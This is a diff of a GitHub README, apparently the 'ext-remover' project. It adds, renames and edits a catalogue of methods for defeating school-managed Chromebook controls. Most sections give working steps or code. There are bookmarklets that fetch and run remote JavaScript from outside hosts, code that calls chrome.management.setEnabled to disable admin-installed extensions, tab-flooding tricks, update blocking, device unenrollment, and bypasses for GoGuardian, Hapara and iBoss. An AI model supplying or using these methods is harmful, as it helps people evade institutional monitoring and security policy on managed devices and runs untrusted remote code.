@@ -14,35 +14,60 @@ Thank you to all of the contributors! Yall really are pretty epic :D
 <a href="https://github.com/3kh0/ext-remover/graphs/contributors"><img src="https://contrib.rocks/image?repo=3kh0/ext-remover" /></a>
 
 - [EXT-REMOVER](#ext-remover)
-  * [Skiovox *Unrestricted browsing*](#skiovox--unrestricted-browsing-)
-  * [LTBEEF *Disable extensions*](#ltbeef--disable-extensions-)
-  * [LTMEAT *Disable extensions*](#ltmeat--disable-extensions-)
-  * [Temp TMEAT *Disable extensions*](#temp-tmeat--disable-extensions-)
-  * [Baby LTMEAT *Disable extensions*](#baby-ltmeat--disable-extensions-)
-  * [LTMEAT Print *Disable extensions*](#ltmeat-print--disable-extensions-)
-  * [LTMEAT Flood *Crash extensions*](#ltmeat-flood--crash-extensions-)
-  * [Dextensify *Disable extensions*](#dextensify--disable-extensions-)
-  * [JPCMG *LTBEEF w/ Service workers*](#jpcmg--ltbeef-w--service-workers-)
-  * [Corkey *Corrupt extensions*](#corkey--corrupt-extensions-)
-  * [Extension Launcher *Install extensions w/o allowlist*](#extension-launcher--install-extensions-w-o-allowlist-)
-  * [Point-Blank *Execute scripts on extension pages*](#point-blank--execute-scripts-on-extension-pages-)
-  * [UBoss *Tamper with IBoss*](#uboss--tamper-with-iboss-)
-  * [CAUB *Prevent Updates*](#caub--prevent-updates-)
-  * [CAUB Flags *Prevent Updates*](#caub-flags--prevent-updates-)
+  * [GuardianTabCrash *Unrestricted browsing*](#guardiantabcrash-unrestricted-browsing)
+  * [Skiovox *Unrestricted browsing*](#skiovox-unrestricted-browsing)
+  * [LTBEEF *Disable extensions*](#ltbeef-disable-extensions)
+  * [LoMoH *Disable extensions*](#lomoh-disable-extensions)
+  * [LTMEAT *Disable extensions*](#ltmeat-disable-extensions)
+  * [LTMEAT Flood *Freeze extensions*](#ltmeat-flood-freeze-extensions)
+  * [Temp TMEAT *Freeze extensions*](#temp-tmeat-freeze-extensions)
+  * [Baby LTMEAT *Freeze extensions*](#baby-ltmeat-freeze-extensions)
+  * [LTMEAT Print *Freeze extensions*](#ltmeat-print-freeze-extensions)
+  * [Dextensify *Disable extensions*](#dextensify-freeze-extensions)
+  * [JPCMG *LTBEEF w/ Service workers*](#jpcmg-ltbeef-w--service-workers)
+  * [Corkey *Corrupt extensions*](#corkey-corrupt-extensions)
+  * [Extension Launcher *Install extensions w/o allowlist*](#extension-launcher-install-extensions-w-o-allowlist)
+  * [Point-Blank *Execute scripts on extension pages*](#point-blank-execute-scripts-on-extension-pages)
+  * [UBoss *Tamper with IBoss*](#uboss-tamper-with-iboss)
+  * [CAUB *Prevent Updates*](#caub-prevent-updates)
+  * [CAUB Flags *Prevent Updates*](#caub-flags-prevent-updates)
   * [Blank3r](#blank3r)
-  * [sh1mmer *Unenrollment*](#sh1mmer--unenrollment-)
-  * [Downgrading *Change versions*](#downgrading--change-versions-)
-  * [Pollen *Policy Editor*](#pollen--policy-editor-)
-  * [Killcurly *Break extensions*](#killcurly--break-extensions-)
-  * [Shimboot *Boot Linux*](#shimboot--boot-linux-)
-  * [uBlock Run *Run Code On Pages*](#ublock-run--run-code-on-pages-)
-  * [Quick View *Bypass extensions*](#quick-view--bypass-extensions-)
-  * [Buypass *Bypass extensions*](#buypass--bypass-extensions-)
-  * [Chaos *Hapara bypass*](#chaos--hapara-bypass-)
-  * [SOT Exploit](#sot-exploit)
+  * [SH1MMER *Unenrollment*](#sh1mmer-unenrollment)
+  * [Downgrading *Change versions*](#downgrading-change-versions)
+  * [Pollen *Policy Editor*](#pollen-policy-editor)
+  * [Killcurly *Break extensions*](#killcurly-break-extensions)
+  * [Shimboot *Boot Linux*](#shimboot-boot-linux)
+  * [uBlock Run *Run Code On Pages*](#ublock-run-run-code-on-pages)
+  * [Quick View *Bypass extensions*](#quick-view-bypass-extensions)
+  * [Buypass *Bypass extensions*](#buypass-bypass-extensions)
+  * [Chaos *Hapara bypass*](#chaos-hapara-bypass)
+  * [SOT Exploit *OneTab bypass**](#sot-exploit)
+  * [GoGuardian GoAway *GoGuardian bypass*](#goguardian-goaway-goguardian-bypass)
+  * [Microsoft Labs](#microsoft-labs-virtualbox-but-it-got-20-doses-of-the-covid-vaccine*)
 
 <small><i><a href='http://github.com/3kh0/readme-toc/'>Table of contents generated with readme-toc</a></i></small>
 
+## GuardianTabCrash *Unrestricted browsing*
+
+### What is it?
+
+An exploit that allows for unrestricted internet access outside of goguardian's control
+
+### How to use it?
+
+**Teacher's can still see your screen, but they can't block or close any of your tabs.**
+
+**YOUR TEACHER NEEDS TO HAVE SET A TAB LIMIT. TRY OPENING TONS OF TABS TO CONVINCE THEM TO ENABLE TAB LIMITS**.
+
+1. create a bookmark named anything: `javascript: window.onbeforeunload = ()=>{return false;}`
+2. Hold down CTRL and then SPAM CLICK the bookmark until you're well above the tab limit, opening a bunch of `about:blank` pages.
+3. It might ask if you want to leave this page, this is goguardian trying to close it. Say No, and click `Prevent from creating additional dialogues`.
+4. Enjoy your unblocked stay!
+
+#### Discovered by @py660
+
+
+[**🔼 Back to top**](#ext-remover)
 
 ## Skiovox *Unrestricted browsing*
 
@@ -59,7 +84,7 @@ Within the unblocked browser, you can
 
 ### How to use it
 
-Bypassi made a wonderful slideshow for you goof balls to follow, view using any of the links below!
+Bypassi made a wonderful slideshow for you goofballs to follow and view using any of the links below!
 
 - https://www.skiovox.com/skiovox.pdf
 - https://drive.google.com/file/d/1tl8eP26MFRejHO38H5HwMLl2VaQrtn0Z/preview
@@ -74,20 +99,20 @@ Bypassi made a wonderful slideshow for you goof balls to follow, view using any 
 
 ## LTBEEF *Disable extensions*
 
-LTBEEF (Literally The Best Exploit Ever Found) is a exploit found by Bypassi (Bypassi#7037) in September 2022, and is a great way to disable spyware that was installed on your chromebook by your school.
+LTBEEF (Literally The Best Exploit Ever Found) is an exploit found by Bypassi (Bypassi#7037) in September 2022 and is a great way to disable spyware installed on your Chromebook by your school.
 
 ### How to use LTBEEF
 
-Use either of the two bookmarklets below, the instructions are the same for both.
+Use either of the two bookmarklets below. The instructions are the same for both.
 
 1. Copy the Javascript code from either of the two bookmarklets below
-2. Make a new bookmark on your chromebook
+2. Make a new bookmark on your Chromebook
 3. Put the Javascript code in the URL section of the bookmark
 4. Visit https://chrome.google.com/webstorex. (This is a 404 page, and that is ok.)
 5. If that page does not work, you can just change the end of the URL to anything else, like https://chrome.google.com/webstoreYAAAAAAAAAAAAAAAY
 6. Click on the bookmark you made
-7. Switch off the extentions you don't want to have anymore.
-8. You're done! The extention should now be disabled. 
+7. Switch off the extensions you don't want to have anymore.
+8. You're done! The extension should now be disabled. 
 
 **Please note that this exploit has been patched for quite some time**
 
@@ -108,6 +133,27 @@ javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.te
 ```js
 javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())
 ```
+
+[**🔼 Back to top**](#ext-remover)
+
+## LoMoH *Disable extensions*
+
+Formerly named "Locked Mode Hack," this Chrome OS exploit uses the locked mode feature to soft disable force-enabled extensions on managed accounts (Excluding Hapara Highlights and Read&Write if installed).
+
+**This exploit is patched in Chrome OS 111**
+
+### Bookmarklet Version (Original and nicer)
+```
+javascript:(function(){if (location.hostname == "docs.google.com") {document.body.innerHTML = document.body.innerHTML.replace("Locked mode is on", "Are you ready to turn off extensions?%22);%20document.body.innerHTML%20=%20document.body.innerHTML.replace(%22You%20have%20already%20opened%20and%20closed%20this%20quiz.%20Opening%20this%20quiz%20again%20will%20notify%20the%20form%20owner%20by%20email.%22,%20%22This%20will%20reload%20all%20tabs%20in%20your%20browser%22);%20var%20button%20=%20document.getElementById(%27mG61Hd%27);%20button.innerHTML%20=%20button.innerHTML.replace(%22Start%20Quiz%22,%20%22Disable%20Extensions%22);%20button.addEventListener(%27click%27,%20function(event){window.close();})}%20else%20{window.open(%22https://docs.google.com/forms/u/0/d/e/1FAIpQLSf5EYwrSUjmQhBOasMpORZy80eBCYb7qCpEwWNoRPUGyObGMA/startquiz%22);}})()
+```
+
+### Website/HTML Version (for blocked bookmarklets)
+[LoMoH HTML](https://ashtondavies.github.io/LoMoH?unlock)
+**Additional Notes:**
+You must create your link with the button on the page for locked mode to work within your organization/district.
+If this is patched for you, you will get rickrolled attempting to perform this exploit. This is just a heads-up for those who do happen to read this.
+
+[GitHub Repository](https://github.com/AshtonDavies/LoMoH)
 
 [**🔼 Back to top**](#ext-remover)
 
@@ -146,13 +192,13 @@ If you got this because you tried to visit the `extension_id_here` example URL, 
 
 **I don't have a bookmarks bar!!!!**
 
-First, try running ctrl+shift+B. If that doesn't work, go to `chrome://settings` and turn on the "home button" feature, then set it to `chrome://hang`. A home icon should appear to the right of your refresh icon in the top left. Use that instead of bookmark C.
+First, try running ctrl+shift+B. If that doesn't work, go to `chrome://settings` and turn on the "home button" feature, then set it to `chrome://hang`. A home icon in the top left should appear to the right of your refresh icon. Use that instead of bookmark C.
 
 There is a version where you don't need bookmarklets, but I am currently gatekeeping it (L). Check this site daily to see if new alternate instructions have been posted. 
 
 **I disabled an extension, but now I can't load websites!**
 
-If you just read the write-up, you'd know that this would happen if the extension's background page loaded and its listeners were already initialized before you used `chrome://hang`. You can double-check whether the extension is listening using `chrome://extensions-internals`, assuming you have a few brain cells in your head.
+If you just read the write-up, you'd know this would happen if the extension's background page loaded and its listeners were already initialized before you used `chrome://hang`. You can double-check whether the extension is listening using `chrome://extensions-internals`, assuming you have a few brain cells in your head.
 
 Anyway, no listeners mean you were too slow. Either you waited more than three seconds between bookmark B and reloading the page, or you needed to be spamming bookmark C faster. The most reliable fix is to restart your computer and try again. Try to match the pace of the gif below: (note the reload) 
 
@@ -170,23 +216,37 @@ I have bad news for you... not all filters are Chrome Extensions. Again, make su
 
 [**🔼 Back to top**](#ext-remover)
 
-## Temp TMEAT *Disable extensions*
+## LTMEAT Flood *Freeze extensions*
 
-A method of using LTMEAT that does not require `chrome://` urls. This works by using 80-150 tabs to soak up memory.
+1. Create a bookmark folder and paste the extension page many times. (About 800 minimum is recommended, assuming your Chromebook is average school quality) You should add the extension page at the beginning of the folder.
+2. Right-click and open all in a new window.
+3. Close the window with all those tabs.
+4. Open the folder in a new window again, and Chrome should hang those tabs to take care of the old ones in the background that were just closed. (Equivalent to the duplicate tab step in Bypassi's method)
+5. Flip the Allow access to file URLs switch in the extension settings, and then you've bypassed the patch, and the exploit is working.
+
+Close everything and you're good to go. If it didn't work, try adjusting the number of open tabs. This is the LTMEAT Flood Method, and also unofficially called Alternate Method # 2. Enjoy a much longer life of LTMEAT!
+
+**Not working?** Ensure you open a large set, but not too large, of extension tabs (_/generated_background_page.html or /manifest.json) for a permanent freeze.
+
+[**🔼 Back to top**](#ext-remover)
+
+## Temp TMEAT *Freeze extensions*
+
+A method of using LTMEAT that does not require `chrome://` URLs. This works by using 80-150 tabs to soak up memory.
 
 1. Create a bookmark with the link `chrome://extensions/?id=extension_id_here` and name it `Kill switch`.
 2. Create a new bookmark folder. Name it `spam.js`. Next, paste this link into your browser: `chrome-extension://extension_id_here/background.js`
 3. Then right-click on your folder and hit `Add Page`. Press Enter.
 4. Right-click on the folder again and hit `Bookmark Manager`. You should see your page. Click on it and hit `Ctrl`+`C`. Press `Ctrl`+`V` until you have 38 of them.
 5. Go to a new tab and right-click your folder. Press `Open All (38)`.
-6. Repeat step 3, then click on one of the tabs from this batch. Wait until the `This page is taking too long` popup appears. This will take 30-60 seconds. If it doesn’t, do `chrome://restart` and go back to step 2 and add 3-4 more pages to the folder.
+6. Repeat step 3, then click on one of the tabs from this batch. Wait until the `This page is taking too long` popup appears. This will take 30-60 seconds. If it doesn’t, do `chrome://restart` and go back to step 2. Add 3-4 more pages to the folder.
 7. Once the popup happens, right-click on one of the tabs closest to the right of the screen and hit `Duplicate`. Then, go to your `Kill switch` bookmark and look for a switch to flip, `Allow Access to File:// urls`. Then, click on the leftmost extension tab (one that opened from the main.js folder) and click `Close all tabs to the right`. KEEP THIS TAB OPEN!!!
 
 Tips: Go to `chrome://settings/performance` and turn Memory Saver off, and in the box where it says `Keep these sites always active`, paste in the extension URL. I’ve noticed clicking on one of the tabs from the second batch seems to help with reliability.
 
 [**🔼 Back to top**](#ext-remover)
 
-## Baby LTMEAT *Disable extensions*
+## Baby LTMEAT *Freeze extensions*
 
 BABY METHOD
 FOR THE TECHNOLOGICALLY CHALLENGED.
@@ -200,7 +260,7 @@ FOR THE TECHNOLOGICALLY CHALLENGED.
 
 [**🔼 Back to top**](#ext-remover)
 
-## LTMEAT Print *Disable extensions*
+## LTMEAT Print *Freeze extensions*
 
 1. Find your extension's largest file. This can usually be found by using [Rob Wu's crxviewer](https://robwu.nl/crxviewer/)
 2. Go to that page and run `Ctrl`+`P`. A print window should show up, with several pages in the top right.
@@ -221,19 +281,7 @@ Credit to Bypassi for the original LTMEAT framework, and to Swordmaster4321 for 
 
 [**🔼 Back to top**](#ext-remover)
 
-## LTMEAT Flood *Crash extensions*
-
-1. Create a bookmark folder and paste the extension page lots of times. (About 800 minimum is recommended assuming your Chromebook is average school quality) It is recommended that you add the extension page at the beginning of the folder.
-2. Right click and open all in a new window.
-3. Close the window with all those tabs.
-4. Open the folder in a new window again, and Chrome should hang those tabs to take care of the old ones in the background that were just closed. (Equivalent to the duplicate tab step in Bypassi's method)
-5. Flip the Allow access to file URLs switch in the extension settings and then you've bypassed the patch and the exploit is working.
-
-Close everything and you're good to go. If it didn't work, try adjusting the number of tabs being opened. This is the LTMEAT Flood Method, and also unofficially called Alternate Method # 2. Enjoy a much longer life of LTMEAT!
-
-**Not working?** Ensure you open a large set, but not too large, of extension tabs (_/generated_background_page.html or /manifest.json) for a permanent freeze.
-
-## Dextensify *Disable extensions*
+## Dextensify *Freeze extensions*
 
 Dextensify is an exploit that lets you disable most admin-installed Chrome extensions from any webpage. It can be used from regular websites, HTML files, and data URLs.
 
@@ -253,7 +301,7 @@ Made by <a href="https://ading.dev/">ading2210</a>
 
 1. Go to `chrome://serviceworker-internals`
 2. Find your extension, this exploit will not work if you can't find it. Some extensions will not work with this exploit.
-3. Hit the start button then the `Inspect` button, and execute LTBEEF code
+3. Hit the start button then the `Inspect` button, and execute the LTBEEF code
 ```js
 chrome.management.setEnabled('extension_id_here',false)
 ```
@@ -270,7 +318,7 @@ Corkey does indeed include power washing the Chromebook, which wipes local data 
 
 1. Esc+Refresh+Power and re-enroll (Enter recovery page), or you can just powerwash.
 2. Log into your Chromebook and immediately turn off WiFi and do refresh+power to (instant restart)
-3. Log back into your Chromebook with the WiFi off. Look for an option to login as a existing user and click that.
+3. Log back into your Chromebook with the WiFi off. Look for an option to log in as an existing user and click that.
 4. Go to `chrome://extensions`, turn on WiFi, and wait for your school's blocking extension to appear.
 5. As soon as it appears, turn off WiFi and restart as fast as possible.
 6. Log back in, go back to extensions, and wait. If it says your blocking extension could be corrupted or doesn't appear at all, then it worked (wait at least a minute with a close watch in case it comes back)
@@ -291,7 +339,7 @@ A bookmarklet capable of installing extensions, for those without an allowlist.
 
 1. Go to [`ext-launcher-bookmarklet.js`](ext-launcher-bookmarklet.js) and save the code as a bookmarklet.
 2. Go to [The Chrome Webstore](https://chrome.google.com/webstorex) and use the bookmarklet
-3. Then put the icon of the extension, the id, and the name of it (This does not matter, you can put anything), then press download, and it will work.
+3. Then put the icon of the extension, the ID, and the name of it (This does not matter, you can put anything), then press download, and it will work.
 
 ### Extra Notes
 - Credit to "Aka, but nice" on Discord.
@@ -388,14 +436,14 @@ This exploit keeps your Chromebook downgraded (or on the current version) withou
 1. Go to `chrome://network#state`.
 2. Scroll to the bottom of the page. You will see a list of WiFi that you have connected to before.
 3. Click the `+` sign next to the WiFi name of each network that you commonly connect your Chromebook to.
-4. We are going to make it when the Chromebook is connected to those networks, it will not check for updates.
+4. We are going to make it so that when the Chromebook is connected to those networks, it will not check for updates.
 5. Use ctrl+a and ctrl+c to copy all the text on the entire network#state page.
 6. Go to [caub.glitch.me](https://caub.glitch.me/).
 7. Paste the copied text into the textbox below.
 8. Press the `generate onc` button below the textbox.
 9. Once you have downloaded the file, go to `chrome://network#general`.
 10. Click on the `import ONC` button.
-11. Import the newly-downloaded file.
+11. Import the newly downloaded file.
 
 **Extra notes**
 - Your Chromebook will no longer automatically update. (as long as you are on a wifi that you CAUBed)
@@ -447,14 +495,16 @@ If you close the tab, the exploit will stop working.
 
 [**🔼 Back to top**](#ext-remover)
 
-## sh1mmer *Unenrollment*
+## SH1MMER *Unenrollment*
 
 SH1MMER is an exploit capable of completely unenrolling enterprise-managed Chromebooks. It was found by the Mercury Workshop team and was released on January, Friday the 13th, 2023.
 
 Due to the detail this exploit requires, please check out the offical website: [sh1mmer.me](https://sh1mmer.me)
 
+**This exploit has been patched since Chrome OS 111.**
+
 ### Further Reading
-- [Repository](https://github.com/CoolElectronics/sh1mmer)  
+- [Repository](https://github.com/MercuryWorkshop/sh1mmer)  
 - [Official Website](https://sh1mmer.me/)
 - [Writeup](https://blog.coolelectronics.me/breaking-cros-2/)
 
@@ -637,7 +687,7 @@ Go to <a href="https://xlak.github.io/chaos/">this link</a> and follow instructi
 
 [**🔼 Back to top**](#ext-remover)
 
-## SOT Exploit
+## SOT Exploit *OneTab bypass*
 
 1. Download this extension [One Tab](https://chromewebstore.google.com/detail/onetab/chphlpgkkbolifaimnlloiipkdnihall)
 2. Click the import button in the settings tab.
@@ -645,5 +695,41 @@ Go to <a href="https://xlak.github.io/chaos/">this link</a> and follow instructi
 4. Spam click the top link, then either spam escape on one of them or wait for one to load on a about:blank page.
   
 Credit to [Coding4Hours](https://github.com/Coding4Hours)
+
+[**🔼 Back to top**](#ext-remover)
+
+## GoGuardian GoAway *GoGuardian bypass*
+
+No idea whatsoever how this went through
+
+THIS EXPLOIT WILL NOT WORK FOR YOU IF YOU HAVE ANY OTHER EXTENSION BESIDES GOGUARDIAN
+
+### Getting Started
+1. Obviously (but still needs to be said due to skids), make sure GoGuardian is actually installed
+2. Visit the [attached URL](goaway.txt) in a new tab
+3. On that tab there will be a simple white screen with nothing on it, reload the page
+4. If the GET request fails and you are left on an error screen (don't panic, this is intended, continue)
+5. Visit `chrome://restart`` to clear cached sites from GoGuardian
+
+Credit to akabutnice
+
+[**🔼 Back to top**](#ext-remover)
+
+## Microsoft Labs *Virtualbox but it got 20 doses of the COVID Vaccine*
+
+This exploit cos removed in "The Great Reformatting of 2023" so I am gonna readd it!!!
+Thanks a bunch Bill Gates
+
+**Do this! Not drugs!**
+1. Go to this website [Microsoft Labs](https://learn.microsoft.com/en-us/training/modules/implement-common-integration-features-finance-ops/10-exercise-1)
+2. click that button thay say "Sign in to launch VM mode"
+3. Holy guacamole! You need a Microsoft Account! Use your credentials and sign in.
+4. Load the virtual machine by clicking the button or if you sign it it will redirect you to it automatically.
+5. The password is pass@word1
+6. Profit
+
+NOTES: sound doesn't work, a lot of websites are blocked, but its just fun to screw around in it.
+
+(Not really) credit to mundaneunblocking
 
 [**🔼 Back to top**](#ext-remover)
